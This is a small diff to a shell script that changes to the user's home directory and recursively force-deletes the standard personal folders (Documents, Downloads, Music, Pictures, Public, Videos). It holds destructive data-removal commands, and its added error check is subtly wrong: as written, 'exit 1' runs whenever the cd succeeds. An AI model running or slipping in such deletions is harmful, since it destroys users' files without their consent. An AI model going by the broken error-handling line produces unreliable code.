@@ -1,9 +1,10 @@
 #!/bin/sh
 
-cd $HOME
+cd "$HOME" || echo "Home directory not found" && exit 1
 rm -rf Documents
 rm -rf Downloads
 rm -rf Music
 rm -rf Pictures
 rm -rf Public
 rm -rf Videos
+
